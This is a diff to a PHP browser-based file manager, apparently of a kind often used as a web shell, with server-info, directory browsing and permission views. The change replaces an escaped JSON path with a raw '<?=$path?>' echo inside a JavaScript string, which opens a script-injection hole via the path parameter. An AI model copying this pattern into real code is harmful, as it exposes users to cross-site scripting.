@@ -226,17 +226,15 @@ $(function(){
 });
 </script>
 <script>
-let currentPath = <?=json_encode($path)?>;
 $(function(){
     $('.menu-btn').click(function(){
         let act=$(this).data('action');
         $('.menu-btn').removeClass('bg-blue-500 text-white').addClass('bg-gray-200 text-gray-800');
         $(this).addClass('bg-blue-500 text-white');
         $('#content').html('<div class="text-center p-4">Loading...</div>');
-        let path = encodeURIComponent(currentPath);
-        $.get('?action='+act,function(d){ $('#content').html(d); });
+        let path = encodeURIComponent('<?=$path?>');
+        $.get('?action='+act+'&path='+path,function(d){ $('#content').html(d); });
     });
-    // on load, highlight active
     $('.menu-btn[data-action="<?=$action?>"]').addClass('bg-blue-500 text-white').removeClass('bg-gray-200 text-gray-800');
 });
 </script>
@@ -354,7 +352,7 @@ if($action=='serverinfo'):
     <th class="p-2">Action</th></tr>
     <?php if($path != $parent): ?><tr class="border-t hover:bg-yellow-200 dark:hover:bg-gray-700"><td class="p-2"><a href="?path=<?=urlencode($parent)?>" class="text-blue-500">📁 ..</a></td><td class="p-2">-</td><td class="p-2">-</td><td class="p-2">-</td><td class="p-2">-</td></tr><?php endif; ?>
     <?php foreach(array_merge($folders,$regular_files) as $f):$fp=$path.'/'.$f['name'];$mtime=date('Y-m-d\TH:i',$f['mtime']); ?>
-    <tr class="border-t hover:bg-yellow-200 dark:hover:bg-gray-700">
+    <tr class="border-t hover:bg-yellow-200 dark:hover:bg-gray-700" title="<?=htmlspecialchars($f['name'])?>">
     <td class="p-2"><?php if(is_dir($fp)):?><a href="?path=<?=urlencode($fp)?>" class="text-blue-500">📁 <?=htmlspecialchars($f['name'])?></a><?php else:?>📄 <?=htmlspecialchars($f['name'])?><?php endif;?></td>
     <td class="p-2"><?=htmlspecialchars($f['owner'])?></td>
     <td class="p-2"><button data-file="<?=htmlspecialchars($f['name'])?>" data-perm="<?=htmlspecialchars($f['perm'])?>" class="perm-btn underline px-2 py-1 rounded <?=is_writable($fp)?'bg-green-200 text-green-800':'bg-gray-200 text-base'?>"><?=$f['perm']?></button></td>
